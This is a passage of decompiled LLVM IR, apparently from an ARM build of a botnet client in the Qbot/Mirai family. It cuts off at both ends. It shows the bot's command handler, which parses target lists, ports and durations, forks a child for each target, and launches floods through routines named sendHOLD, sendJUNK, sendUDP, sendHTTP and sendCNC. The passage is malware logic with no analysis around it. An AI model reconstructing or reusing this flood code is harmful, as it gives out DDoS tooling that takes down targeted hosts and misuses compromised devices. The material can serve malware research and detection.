  %v3_11ad8 = inttoptr i32 %v2_11acc to i8*
  %v4_11ad8 = call i32 @__GI_strcoll(i8* %v3_11ad8, i32 ptrtoint ([6 x i8]* @global_var_1eec0.789 to i32))
  %v2_11ae0 = icmp eq i32 %v4_11ad8, 0
  br i1 %v2_11ae0, label %dec_label_pc_11ae8, label %dec_label_pc_11b38

dec_label_pc_11ae8:                               ; preds = %dec_label_pc_11ac8
  %v7_11aec = icmp eq i32 %arg1, 2
  br i1 %v7_11aec, label %dec_label_pc_11af4, label %dec_label_pc_12be0

dec_label_pc_11af4:                               ; preds = %dec_label_pc_11ae8
  %v1_11af8 = add i32 %tmp, 4
  %v1_11afc = inttoptr i32 %v1_11af8 to i32*
  %v2_11afc = load i32, i32* %v1_11afc, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1eebc.787 to i32), i32* @r1, align 4
  %v3_11b08 = inttoptr i32 %v2_11afc to i8*
  %v4_11b08 = call i32 @__GI_strcoll(i8* %v3_11b08, i32 ptrtoint ([3 x i8]* @global_var_1eebc.787 to i32))
  %v2_11b10 = icmp eq i32 %v4_11b08, 0
  br i1 %v2_11b10, label %dec_label_pc_11b18, label %dec_label_pc_11b38

dec_label_pc_11b18:                               ; preds = %dec_label_pc_11af4
  %v2_11b1c = load i32, i32* @global_var_28c44.54, align 4
  %v3_11b28 = call i32 @HackerPrint(i32 %v2_11b1c, i32 ptrtoint ([25 x i8]* @global_var_1eec8.791 to i32))
  %v1_11b2c = call i32 @StartTheNetis(i32 %v3_11b28)
  %v1_11b34 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11b38:                               ; preds = %dec_label_pc_11af4, %dec_label_pc_11ac8
  %v2_11b3c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1eee4.793 to i32), i32* @r1, align 4
  %v3_11b48 = inttoptr i32 %v2_11b3c to i8*
  %v4_11b48 = call i32 @__GI_strcoll(i8* %v3_11b48, i32 ptrtoint ([5 x i8]* @global_var_1eee4.793 to i32))
  %v2_11b50 = icmp eq i32 %v4_11b48, 0
  br i1 %v2_11b50, label %dec_label_pc_11b58, label %dec_label_pc_11c9c

dec_label_pc_11b58:                               ; preds = %dec_label_pc_11b38
  %v7_11b60 = icmp slt i32 %arg1, 4
  br i1 %v7_11b60, label %dec_label_pc_12be0, label %dec_label_pc_11b64

dec_label_pc_11b64:                               ; preds = %dec_label_pc_11b58
  %v1_11b68 = add i32 %tmp, 8
  %v1_11b6c = inttoptr i32 %v1_11b68 to i32*
  %v2_11b6c = load i32, i32* %v1_11b6c, align 4
  store i32 %v2_11b6c, i32* @r0, align 4
  %v1_11b74 = call i32 @atol(i32 %v2_11b6c)
  %tmp131 = icmp slt i32 %v1_11b74, 1
  br i1 %tmp131, label %dec_label_pc_12be0, label %dec_label_pc_11b84

dec_label_pc_11b84:                               ; preds = %dec_label_pc_11b64
  %v1_11b88 = add i32 %tmp, 12
  %v1_11b8c = inttoptr i32 %v1_11b88 to i32*
  %v2_11b8c = load i32, i32* %v1_11b8c, align 4
  store i32 %v2_11b8c, i32* @r0, align 4
  %v1_11b94 = call i32 @atol(i32 %v2_11b8c)
  %v5_11ba0 = icmp sgt i32 %v1_11b94, 0
  br i1 %v5_11ba0, label %dec_label_pc_11ba8, label %dec_label_pc_12be0

dec_label_pc_11ba8:                               ; preds = %dec_label_pc_11b84
  %v1_11bac = add i32 %tmp, 4
  %v1_11bb0 = inttoptr i32 %v1_11bac to i32*
  %v2_11bb0 = load i32, i32* %v1_11bb0, align 4
  %v2_11bc0 = load i32, i32* %v1_11b6c, align 4
  store i32 %v2_11bc0, i32* @r0, align 4
  %v1_11bc8 = call i32 @atol(i32 %v2_11bc0)
  %v2_11bdc = load i32, i32* %v1_11b8c, align 4
  store i32 %v2_11bdc, i32* @r0, align 4
  %v1_11be4 = call i32 @atol(i32 %v2_11bdc)
  %v2_11bfc = call i32 @__GI_strchr(i32 %v2_11bb0, i32 44)
  %v2_11c04 = icmp eq i32 %v2_11bfc, 0
  br i1 %v2_11c04, label %dec_label_pc_11c74, label %dec_label_pc_11c0c

dec_label_pc_11c0c:                               ; preds = %dec_label_pc_11ba8
  store i32 %v2_11bb0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_11c18 = call i32 @__GI_strtok(i32 %v2_11bb0, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_11c6857 = icmp eq i32 %v2_11c18, 0
  br i1 %v2_11c6857, label %dec_label_pc_11c9c, label %dec_label_pc_11c28

dec_label_pc_11c28:                               ; preds = %dec_label_pc_11c0c, %dec_label_pc_11c50
  %storemerge2858 = phi i32 [ %v2_11c58, %dec_label_pc_11c50 ], [ %v2_11c18, %dec_label_pc_11c0c ]
  %v0_11c28 = call i32 @listFork()
  %v2_11c30 = icmp eq i32 %v0_11c28, 0
  br i1 %v2_11c30, label %dec_label_pc_11c38, label %dec_label_pc_11c50

dec_label_pc_11c38:                               ; preds = %dec_label_pc_11c28
  %v3_11c44 = call i32 @sendHOLD(i32 %storemerge2858, i32 %v1_11bc8, i32 %v1_11be4)
  %v1_11c4c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11c50:                               ; preds = %dec_label_pc_11c28
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_11c58 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_11c68 = icmp eq i32 %v2_11c58, 0
  br i1 %v2_11c68, label %dec_label_pc_11c9c, label %dec_label_pc_11c28

dec_label_pc_11c74:                               ; preds = %dec_label_pc_11ba8
  %v0_11c74 = call i32 @listFork()
  %v2_11c7c = icmp eq i32 %v0_11c74, 0
  br i1 %v2_11c7c, label %dec_label_pc_11c84, label %dec_label_pc_12be0

dec_label_pc_11c84:                               ; preds = %dec_label_pc_11c74
  %v3_11c90 = call i32 @sendHOLD(i32 %v2_11bb0, i32 %v1_11bc8, i32 %v1_11be4)
  %v1_11c98 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11c9c:                               ; preds = %dec_label_pc_11c50, %dec_label_pc_11c0c, %dec_label_pc_11b38
  %v2_11ca0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1eeec.796 to i32), i32* @r1, align 4
  %v3_11cac = inttoptr i32 %v2_11ca0 to i8*
  %v4_11cac = call i32 @__GI_strcoll(i8* %v3_11cac, i32 ptrtoint ([5 x i8]* @global_var_1eeec.796 to i32))
  %v2_11cb4 = icmp eq i32 %v4_11cac, 0
  br i1 %v2_11cb4, label %dec_label_pc_11cbc, label %dec_label_pc_11e10

dec_label_pc_11cbc:                               ; preds = %dec_label_pc_11c9c
  %v7_11cc4 = icmp slt i32 %arg1, 4
  br i1 %v7_11cc4, label %dec_label_pc_12be0, label %dec_label_pc_11cc8

dec_label_pc_11cc8:                               ; preds = %dec_label_pc_11cbc
  %v1_11ccc = add i32 %tmp, 8
  %v1_11cd0 = inttoptr i32 %v1_11ccc to i32*
  %v2_11cd0 = load i32, i32* %v1_11cd0, align 4
  store i32 %v2_11cd0, i32* @r0, align 4
  %v1_11cd8 = call i32 @atol(i32 %v2_11cd0)
  %tmp132 = icmp slt i32 %v1_11cd8, 1
  br i1 %tmp132, label %dec_label_pc_12be0, label %dec_label_pc_11ce8

dec_label_pc_11ce8:                               ; preds = %dec_label_pc_11cc8
  %v1_11cec = add i32 %tmp, 12
  %v1_11cf0 = inttoptr i32 %v1_11cec to i32*
  %v2_11cf0 = load i32, i32* %v1_11cf0, align 4
  store i32 %v2_11cf0, i32* @r0, align 4
  %v1_11cf8 = call i32 @atol(i32 %v2_11cf0)
  %v5_11d04 = icmp sgt i32 %v1_11cf8, 0
  br i1 %v5_11d04, label %dec_label_pc_11d0c, label %dec_label_pc_12be0

dec_label_pc_11d0c:                               ; preds = %dec_label_pc_11ce8
  %v1_11d10 = add i32 %tmp, 4
  %v1_11d14 = inttoptr i32 %v1_11d10 to i32*
  %v2_11d14 = load i32, i32* %v1_11d14, align 4
  %v2_11d24 = load i32, i32* %v1_11cd0, align 4
  store i32 %v2_11d24, i32* @r0, align 4
  %v1_11d2c = call i32 @atol(i32 %v2_11d24)
  %v2_11d40 = load i32, i32* %v1_11cf0, align 4
  store i32 %v2_11d40, i32* @r0, align 4
  %v1_11d48 = call i32 @atol(i32 %v2_11d40)
  %v2_11d60 = call i32 @__GI_strchr(i32 %v2_11d14, i32 44)
  %v2_11d68 = icmp eq i32 %v2_11d60, 0
  br i1 %v2_11d68, label %dec_label_pc_11de8, label %dec_label_pc_11d70

dec_label_pc_11d70:                               ; preds = %dec_label_pc_11d0c
  store i32 %v2_11d14, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_11d7c = call i32 @__GI_strtok(i32 %v2_11d14, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_11ddc54 = icmp eq i32 %v2_11d7c, 0
  br i1 %v2_11ddc54, label %dec_label_pc_11e10, label %dec_label_pc_11d8c

dec_label_pc_11d8c:                               ; preds = %dec_label_pc_11d70, %dec_label_pc_11dc4
  %storemerge2655 = phi i32 [ %v2_11dcc, %dec_label_pc_11dc4 ], [ %v2_11d7c, %dec_label_pc_11d70 ]
  %v0_11d8c = call i32 @listFork()
  %v2_11d94 = icmp eq i32 %v0_11d8c, 0
  br i1 %v2_11d94, label %dec_label_pc_11d9c, label %dec_label_pc_11dc4

dec_label_pc_11d9c:                               ; preds = %dec_label_pc_11d8c
  %v4_11da8 = call i32 @sendJUNK(i32 %storemerge2655, i32 %v1_11d2c, i32 %v1_11d48, i32 0)
  %v2_11db0 = load i32, i32* @global_var_28c44.54, align 4
  %v1_11db8 = call i32 @__libc_close(i32 %v2_11db0)
  %v1_11dc0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11dc4:                               ; preds = %dec_label_pc_11d8c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_11dcc = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_11ddc = icmp eq i32 %v2_11dcc, 0
  br i1 %v2_11ddc, label %dec_label_pc_11e10, label %dec_label_pc_11d8c

dec_label_pc_11de8:                               ; preds = %dec_label_pc_11d0c
  %v0_11de8 = call i32 @listFork()
  %v2_11df0 = icmp eq i32 %v0_11de8, 0
  br i1 %v2_11df0, label %dec_label_pc_11df8, label %dec_label_pc_12be0

dec_label_pc_11df8:                               ; preds = %dec_label_pc_11de8
  %v4_11e04 = call i32 @sendJUNK(i32 %v2_11d14, i32 %v1_11d2c, i32 %v1_11d48, i32 0)
  %v1_11e0c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11dc4, %dec_label_pc_11d70, %dec_label_pc_11c9c
  %v2_11e14 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1eef4.798 to i32), i32* @r1, align 4
  %v3_11e20 = inttoptr i32 %v2_11e14 to i8*
  %v4_11e20 = call i32 @__GI_strcoll(i8* %v3_11e20, i32 ptrtoint ([4 x i8]* @global_var_1eef4.798 to i32))
  %v2_11e28 = icmp eq i32 %v4_11e20, 0
  br i1 %v2_11e28, label %dec_label_pc_11e30, label %dec_label_pc_120c0

dec_label_pc_11e30:                               ; preds = %dec_label_pc_11e10
  %v7_11e38 = icmp slt i32 %arg1, 6
  br i1 %v7_11e38, label %dec_label_pc_12be0, label %dec_label_pc_11e3c

dec_label_pc_11e3c:                               ; preds = %dec_label_pc_11e30
  %v1_11e40 = add i32 %tmp, 12
  %v1_11e44 = inttoptr i32 %v1_11e40 to i32*
  %v2_11e44 = load i32, i32* %v1_11e44, align 4
  store i32 %v2_11e44, i32* @r0, align 4
  %v1_11e4c = call i32 @atol(i32 %v2_11e44)
  %v7_11e54 = icmp eq i32 %v1_11e4c, -1
  br i1 %v7_11e54, label %dec_label_pc_12be0, label %dec_label_pc_11e5c

dec_label_pc_11e5c:                               ; preds = %dec_label_pc_11e3c
  %v1_11e60 = add i32 %tmp, 8
  %v1_11e64 = inttoptr i32 %v1_11e60 to i32*
  %v2_11e64 = load i32, i32* %v1_11e64, align 4
  store i32 %v2_11e64, i32* @r0, align 4
  %v1_11e6c = call i32 @atol(i32 %v2_11e64)
  %v7_11e74 = icmp eq i32 %v1_11e6c, -1
  br i1 %v7_11e74, label %dec_label_pc_12be0, label %dec_label_pc_11e7c

dec_label_pc_11e7c:                               ; preds = %dec_label_pc_11e5c
  %v1_11e80 = add i32 %tmp, 16
  %v1_11e84 = inttoptr i32 %v1_11e80 to i32*
  %v2_11e84 = load i32, i32* %v1_11e84, align 4
  store i32 %v2_11e84, i32* @r0, align 4
  %v1_11e8c = call i32 @atol(i32 %v2_11e84)
  %v7_11e94 = icmp eq i32 %v1_11e8c, -1
  br i1 %v7_11e94, label %dec_label_pc_12be0, label %dec_label_pc_11e9c

dec_label_pc_11e9c:                               ; preds = %dec_label_pc_11e7c
  %v1_11ea0 = add i32 %tmp, 20
  %v1_11ea4 = inttoptr i32 %v1_11ea0 to i32*
  %v2_11ea4 = load i32, i32* %v1_11ea4, align 4
  store i32 %v2_11ea4, i32* @r0, align 4
  %v1_11eac = call i32 @atol(i32 %v2_11ea4)
  %v7_11eb4 = icmp eq i32 %v1_11eac, -1
  br i1 %v7_11eb4, label %dec_label_pc_12be0, label %dec_label_pc_11ebc

dec_label_pc_11ebc:                               ; preds = %dec_label_pc_11e9c
  %v2_11ec4 = load i32, i32* %v1_11ea4, align 4
  store i32 %v2_11ec4, i32* @r0, align 4
  %v1_11ecc = call i32 @atol(i32 %v2_11ec4)
  %v8_11ee0 = icmp sgt i32 %v1_11ecc, 65500
  br i1 %v8_11ee0, label %dec_label_pc_12be0, label %dec_label_pc_11ee4

dec_label_pc_11ee4:                               ; preds = %dec_label_pc_11ebc
  %v2_11eec = load i32, i32* %v1_11e84, align 4
  store i32 %v2_11eec, i32* @r0, align 4
  %v1_11ef4 = call i32 @atol(i32 %v2_11eec)
  %v8_11f00 = icmp sgt i32 %v1_11ef4, 32
  br i1 %v8_11f00, label %dec_label_pc_12be0, label %dec_label_pc_11f04

dec_label_pc_11f04:                               ; preds = %dec_label_pc_11ee4
  %v7_11f08 = icmp eq i32 %arg1, 7
  br i1 %v7_11f08, label %dec_label_pc_11f10, label %dec_label_pc_11f34

dec_label_pc_11f10:                               ; preds = %dec_label_pc_11f04
  %v1_11f14 = add i32 %tmp, 24
  %v1_11f18 = inttoptr i32 %v1_11f14 to i32*
  %v2_11f18 = load i32, i32* %v1_11f18, align 4
  store i32 %v2_11f18, i32* @r0, align 4
  %v1_11f20 = call i32 @atol(i32 %v2_11f18)
  %v5_11f2c = icmp sgt i32 %v1_11f20, 0
  br i1 %v5_11f2c, label %dec_label_pc_11f34, label %dec_label_pc_12be0

dec_label_pc_11f34:                               ; preds = %dec_label_pc_11f04, %dec_label_pc_11f10
  %v1_11f38 = add i32 %tmp, 4
  %v1_11f3c = inttoptr i32 %v1_11f38 to i32*
  %v2_11f3c = load i32, i32* %v1_11f3c, align 4
  %v2_11f4c = load i32, i32* %v1_11e64, align 4
  store i32 %v2_11f4c, i32* @r0, align 4
  %v1_11f54 = call i32 @atol(i32 %v2_11f4c)
  %v2_11f68 = load i32, i32* %v1_11e44, align 4
  store i32 %v2_11f68, i32* @r0, align 4
  %v1_11f70 = call i32 @atol(i32 %v2_11f68)
  %v2_11f84 = load i32, i32* %v1_11e84, align 4
  store i32 %v2_11f84, i32* @r0, align 4
  %v1_11f8c = call i32 @atol(i32 %v2_11f84)
  %v2_11fa0 = load i32, i32* %v1_11ea4, align 4
  store i32 %v2_11fa0, i32* @r0, align 4
  %v1_11fa8 = call i32 @atol(i32 %v2_11fa0)
  br i1 %v7_11f08, label %dec_label_pc_11fc0, label %dec_label_pc_11fdc

dec_label_pc_11fc0:                               ; preds = %dec_label_pc_11f34
  %v1_11fc4 = add i32 %tmp, 24
  %v1_11fc8 = inttoptr i32 %v1_11fc4 to i32*
  %v2_11fc8 = load i32, i32* %v1_11fc8, align 4
  store i32 %v2_11fc8, i32* @r0, align 4
  %v1_11fd0 = call i32 @atol(i32 %v2_11fc8)
  br label %dec_label_pc_11fe4

dec_label_pc_11fdc:                               ; preds = %dec_label_pc_11f34
  br label %dec_label_pc_11fe4

dec_label_pc_11fe4:                               ; preds = %dec_label_pc_11fc0, %dec_label_pc_11fdc
  %storemerge9 = phi i32 [ 10, %dec_label_pc_11fdc ], [ %v1_11fd0, %dec_label_pc_11fc0 ]
  %v2_11ff8 = call i32 @__GI_strchr(i32 %v2_11f3c, i32 44)
  %v2_12000 = icmp eq i32 %v2_11ff8, 0
  br i1 %v2_12000, label %dec_label_pc_12084, label %dec_label_pc_12008

dec_label_pc_12008:                               ; preds = %dec_label_pc_11fe4
  store i32 %v2_11f3c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_12014 = call i32 @__GI_strtok(i32 %v2_11f3c, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_1207851 = icmp eq i32 %v2_12014, 0
  br i1 %v2_1207851, label %dec_label_pc_120c0, label %dec_label_pc_12024

dec_label_pc_12024:                               ; preds = %dec_label_pc_12008, %dec_label_pc_12060
  %storemerge2452 = phi i32 [ %v2_12068, %dec_label_pc_12060 ], [ %v2_12014, %dec_label_pc_12008 ]
  %v0_12024 = call i32 @listFork()
  %v2_1202c = icmp eq i32 %v0_12024, 0
  br i1 %v2_1202c, label %dec_label_pc_12034, label %dec_label_pc_12060

dec_label_pc_12034:                               ; preds = %dec_label_pc_12024
  %v6_12054 = call i32 @sendUDP(i32 %storemerge2452, i32 %v1_11f54, i32 %v1_11f70, i32 %v1_11f8c, i32 %v1_11fa8, i32 %storemerge9)
  %v1_1205c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12060:                               ; preds = %dec_label_pc_12024
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_12068 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_12078 = icmp eq i32 %v2_12068, 0
  br i1 %v2_12078, label %dec_label_pc_120c0, label %dec_label_pc_12024

dec_label_pc_12084:                               ; preds = %dec_label_pc_11fe4
  %v0_12084 = call i32 @listFork()
  %v2_1208c = icmp eq i32 %v0_12084, 0
  br i1 %v2_1208c, label %dec_label_pc_12094, label %dec_label_pc_12be0

dec_label_pc_12094:                               ; preds = %dec_label_pc_12084
  %v6_120b4 = call i32 @sendUDP(i32 %v2_11f3c, i32 %v1_11f54, i32 %v1_11f70, i32 %v1_11f8c, i32 %v1_11fa8, i32 %storemerge9)
  %v1_120bc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_120c0:                               ; preds = %dec_label_pc_12060, %dec_label_pc_12008, %dec_label_pc_11e10
  %v2_120c4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1eef8.800 to i32), i32* @r1, align 4
  %v3_120d0 = inttoptr i32 %v2_120c4 to i8*
  %v4_120d0 = call i32 @__GI_strcoll(i8* %v3_120d0, i32 ptrtoint ([5 x i8]* @global_var_1eef8.800 to i32))
  %v2_120d8 = icmp eq i32 %v4_120d0, 0
  br i1 %v2_120d8, label %dec_label_pc_120e0, label %dec_label_pc_122c8

dec_label_pc_120e0:                               ; preds = %dec_label_pc_120c0
  %v7_120e8 = icmp slt i32 %arg1, 6
  br i1 %v7_120e8, label %dec_label_pc_12be0, label %dec_label_pc_120ec

dec_label_pc_120ec:                               ; preds = %dec_label_pc_120e0
  %v1_120f0 = add i32 %tmp, 4
  %v1_120f4 = inttoptr i32 %v1_120f0 to i32*
  %v2_120f4 = load i32, i32* %v1_120f4, align 4
  %v2_12100 = call i32 @__GI_strchr(i32 %v2_120f4, i32 44)
  %v2_12108 = icmp eq i32 %v2_12100, 0
  br i1 %v2_12108, label %dec_label_pc_12210, label %dec_label_pc_12110

dec_label_pc_12110:                               ; preds = %dec_label_pc_120ec
  %v2_12118 = load i32, i32* %v1_120f4, align 4
  store i32 %v2_12118, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_12124 = call i32 @__GI_strtok(i32 %v2_12118, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_1220449 = icmp eq i32 %v2_12124, 0
  br i1 %v2_1220449, label %dec_label_pc_122c8, label %dec_label_pc_12134

dec_label_pc_12134:                               ; preds = %dec_label_pc_12110, %dec_label_pc_121ec
  %v0_12134 = call i32 @listFork()
  %v2_1213c = icmp eq i32 %v0_12134, 0
  br i1 %v2_1213c, label %dec_label_pc_12144, label %dec_label_pc_121ec

dec_label_pc_12144:                               ; preds = %dec_label_pc_12134
  %v2_1214c = load i32, i32* %v1_120f4, align 4
  store i32 %v2_1214c, i32* @r5, align 4
  %v1_12158 = add i32 %tmp, 8
  %v1_1215c = inttoptr i32 %v1_12158 to i32*
  %v2_1215c = load i32, i32* %v1_1215c, align 4
  store i32 %v2_1215c, i32* @r6, align 4
  %v1_12168 = add i32 %tmp, 12
  %v1_1216c = inttoptr i32 %v1_12168 to i32*
  %v2_1216c = load i32, i32* %v1_1216c, align 4
  store i32 %v2_1216c, i32* @r0, align 4
  %v1_12174 = call i32 @atol(i32 %v2_1216c)
  %v3_12180 = urem i32 %v1_12174, 65536
  store i32 %v3_12180, i32* @r7, align 4
  %v1_1218c = add i32 %tmp, 16
  %v1_12190 = inttoptr i32 %v1_1218c to i32*
  %v2_12190 = load i32, i32* %v1_12190, align 4
  store i32 %v2_12190, i32* @r8, align 4
  %v1_1219c = add i32 %tmp, 20
  %v1_121a0 = inttoptr i32 %v1_1219c to i32*
  %v2_121a0 = load i32, i32* %v1_121a0, align 4
  store i32 %v2_121a0, i32* @r0, align 4
  %v1_121a8 = call i32 @atol(i32 %v2_121a0)
  store i32 %v1_121a8, i32* @r4, align 4
  %v1_121b4 = add i32 %tmp, 24
  %v1_121b8 = inttoptr i32 %v1_121b4 to i32*
  %v2_121b8 = load i32, i32* %v1_121b8, align 4
  store i32 %v2_121b8, i32* @r0, align 4
  %v1_121c0 = call i32 @atol(i32 %v2_121b8)
  %v0_121c8 = load i32, i32* @r4, align 4
  %v0_121d0 = load i32, i32* @r5, align 4
  %v0_121d4 = load i32, i32* @r6, align 4
  %v0_121d8 = load i32, i32* @r7, align 4
  %v0_121dc = load i32, i32* @r8, align 4
  %v6_121e0 = trunc i32 %v0_121d8 to i8
  %v7_121e0 = call i32 @sendHTTP(i32 %v0_121d0, i32 %v0_121d4, i8 %v6_121e0, i32 %v0_121dc, i32 %v0_121c8, i32 %v1_121c0)
  %v1_121e8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_121ec:                               ; preds = %dec_label_pc_12134
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_121f4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_12204 = icmp eq i32 %v2_121f4, 0
  br i1 %v2_12204, label %dec_label_pc_122c8, label %dec_label_pc_12134

dec_label_pc_12210:                               ; preds = %dec_label_pc_120ec
  %v0_12210 = call i32 @listFork()
  %v2_12218 = icmp eq i32 %v0_12210, 0
  br i1 %v2_12218, label %dec_label_pc_12220, label %dec_label_pc_12be0

dec_label_pc_12220:                               ; preds = %dec_label_pc_12210
  %v2_12228 = load i32, i32* %v1_120f4, align 4
  store i32 %v2_12228, i32* @r5, align 4
  %v1_12234 = add i32 %tmp, 8
  %v1_12238 = inttoptr i32 %v1_12234 to i32*
  %v2_12238 = load i32, i32* %v1_12238, align 4
  store i32 %v2_12238, i32* @r6, align 4
  %v1_12244 = add i32 %tmp, 12
  %v1_12248 = inttoptr i32 %v1_12244 to i32*
  %v2_12248 = load i32, i32* %v1_12248, align 4
  store i32 %v2_12248, i32* @r0, align 4
  %v1_12250 = call i32 @atol(i32 %v2_12248)
  %v3_1225c = urem i32 %v1_12250, 65536
  store i32 %v3_1225c, i32* @r7, align 4
  %v1_12268 = add i32 %tmp, 16
  %v1_1226c = inttoptr i32 %v1_12268 to i32*
  %v2_1226c = load i32, i32* %v1_1226c, align 4
  store i32 %v2_1226c, i32* @r8, align 4
  %v1_12278 = add i32 %tmp, 20
  %v1_1227c = inttoptr i32 %v1_12278 to i32*
  %v2_1227c = load i32, i32* %v1_1227c, align 4
  store i32 %v2_1227c, i32* @r0, align 4
  %v1_12284 = call i32 @atol(i32 %v2_1227c)
  store i32 %v1_12284, i32* @r4, align 4
  %v1_12290 = add i32 %tmp, 24
  %v1_12294 = inttoptr i32 %v1_12290 to i32*
  %v2_12294 = load i32, i32* %v1_12294, align 4
  store i32 %v2_12294, i32* @r0, align 4
  %v1_1229c = call i32 @atol(i32 %v2_12294)
  %v0_122a4 = load i32, i32* @r4, align 4
  %v0_122ac = load i32, i32* @r5, align 4
  %v0_122b0 = load i32, i32* @r6, align 4
  %v0_122b4 = load i32, i32* @r7, align 4
  %v0_122b8 = load i32, i32* @r8, align 4
  %v6_122bc = trunc i32 %v0_122b4 to i8
  %v7_122bc = call i32 @sendHTTP(i32 %v0_122ac, i32 %v0_122b0, i8 %v6_122bc, i32 %v0_122b8, i32 %v0_122a4, i32 %v1_1229c)
  %v1_122c4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_122c8:                               ; preds = %dec_label_pc_121ec, %dec_label_pc_12110, %dec_label_pc_120c0
  %v2_122cc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1ef00.802 to i32), i32* @r1, align 4
  %v3_122d8 = inttoptr i32 %v2_122cc to i8*
  %v4_122d8 = call i32 @__GI_strcoll(i8* %v3_122d8, i32 ptrtoint ([4 x i8]* @global_var_1ef00.802 to i32))
  %v2_122e0 = icmp eq i32 %v4_122d8, 0
  br i1 %v2_122e0, label %dec_label_pc_122e8, label %dec_label_pc_1243c

dec_label_pc_122e8:                               ; preds = %dec_label_pc_122c8
  %v7_122f0 = icmp slt i32 %arg1, 4
  br i1 %v7_122f0, label %dec_label_pc_12be0, label %dec_label_pc_122f4

dec_label_pc_122f4:                               ; preds = %dec_label_pc_122e8
  %v1_122f8 = add i32 %tmp, 8
  %v1_122fc = inttoptr i32 %v1_122f8 to i32*
  %v2_122fc = load i32, i32* %v1_122fc, align 4
  store i32 %v2_122fc, i32* @r0, align 4
  %v1_12304 = call i32 @atol(i32 %v2_122fc)
  %tmp134 = icmp slt i32 %v1_12304, 1
  br i1 %tmp134, label %dec_label_pc_12be0, label %dec_label_pc_12314

dec_label_pc_12314:                               ; preds = %dec_label_pc_122f4
  %v1_12318 = add i32 %tmp, 12
  %v1_1231c = inttoptr i32 %v1_12318 to i32*
  %v2_1231c = load i32, i32* %v1_1231c, align 4
  store i32 %v2_1231c, i32* @r0, align 4
  %v1_12324 = call i32 @atol(i32 %v2_1231c)
  %v5_12330 = icmp sgt i32 %v1_12324, 0
  br i1 %v5_12330, label %dec_label_pc_12338, label %dec_label_pc_12be0

dec_label_pc_12338:                               ; preds = %dec_label_pc_12314
  %v1_1233c = add i32 %tmp, 4
  %v1_12340 = inttoptr i32 %v1_1233c to i32*
  %v2_12340 = load i32, i32* %v1_12340, align 4
  %v2_12350 = load i32, i32* %v1_122fc, align 4
  store i32 %v2_12350, i32* @r0, align 4
  %v1_12358 = call i32 @atol(i32 %v2_12350)
  %v2_1236c = load i32, i32* %v1_1231c, align 4
  store i32 %v2_1236c, i32* @r0, align 4
  %v1_12374 = call i32 @atol(i32 %v2_1236c)
  %v2_1238c = call i32 @__GI_strchr(i32 %v2_12340, i32 44)
  %v2_12394 = icmp eq i32 %v2_1238c, 0
  br i1 %v2_12394, label %dec_label_pc_12414, label %dec_label_pc_1239c

dec_label_pc_1239c:                               ; preds = %dec_label_pc_12338
  store i32 %v2_12340, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_123a8 = call i32 @__GI_strtok(i32 %v2_12340, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_1240846 = icmp eq i32 %v2_123a8, 0
  br i1 %v2_1240846, label %dec_label_pc_1243c, label %dec_label_pc_123b8

dec_label_pc_123b8:                               ; preds = %dec_label_pc_1239c, %dec_label_pc_123f0
  %storemerge2047 = phi i32 [ %v2_123f8, %dec_label_pc_123f0 ], [ %v2_123a8, %dec_label_pc_1239c ]
  %v0_123b8 = call i32 @listFork()
  %v2_123c0 = icmp eq i32 %v0_123b8, 0
  br i1 %v2_123c0, label %dec_label_pc_123c8, label %dec_label_pc_123f0

dec_label_pc_123c8:                               ; preds = %dec_label_pc_123b8
  %v4_123d4 = call i32 @sendCNC(i32 %storemerge2047, i32 %v1_12358, i32 %v1_12374, i32 0)
  %v2_123dc = load i32, i32* @global_var_28c44.54, align 4
  %v1_123e4 = call i32 @__libc_close(i32 %v2_123dc)
  %v1_123ec = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_123f0:                               ; preds = %dec_label_pc_123b8
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
